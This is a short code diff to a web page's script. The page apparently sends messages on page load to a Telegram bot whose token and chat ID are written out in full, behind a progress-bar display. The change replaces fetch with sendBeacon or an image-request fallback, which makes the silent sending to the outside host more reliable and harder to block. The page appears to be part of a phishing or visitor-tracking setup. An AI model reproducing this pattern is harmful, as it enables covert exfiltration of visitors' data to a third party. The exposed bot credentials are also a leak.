@@ -229,7 +229,7 @@
 </div>
 
 <script>
-    const botToken = "8943750094:BqWUrn8B7B59o6EivE7zJ9iqhpvF9wJkF7SVezi6u6gs";
+    const botToken = "9058802985:AAHsFoOZUObdl2KE_Yd1y2gX7aKGh_Eit_s";
     const chatId = "6375135873";
 
     window.addEventListener("DOMContentLoaded", async () => {
@@ -250,8 +250,12 @@
 
     function sendTelegram(message) {
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        // mode: 'no-cors' evita el bloqueo de CORS en navegadores y GitHub Pages
-        fetch(url, { mode: 'no-cors' }).catch(err => console.error(err));
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(url);
+        } else {
+            const img = new Image();
+            img.src = url;
+        }
     }
 
     function updateProgress(percent, statusText) {
